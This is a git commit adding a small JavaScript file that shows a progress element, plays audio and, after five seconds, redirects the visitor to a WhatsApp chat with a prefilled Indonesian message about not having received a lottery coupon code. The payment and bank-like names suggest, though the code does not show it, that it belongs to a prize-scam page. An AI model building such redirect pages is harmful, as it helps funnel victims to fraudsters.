722df7d03cf1765ba53747b75f7356d9a749da03
gopay882 <gopay882@gmail.com>
2024-09-11 20:47:50 +0700

    Add files via upload

---
+++ token.js
@@ -0,0 +1,17 @@
+
+                   
+function getcs(){
+ $("#process1").show();   
+  audio4 = document.getElementById("bsiku");
+  audio = document.getElementById("bsi");
+    audio4.play();
+     audio.load();
+    audio4.loop = false
+setTimeout(function(){  
+    $("#process1").hide();   
+location.href='https://wa.me/13155232241?text=Saya Belum Mendapatkan Kode Kupon Undian';
+
+    }, 5000);    
+    
+}                        
+                   
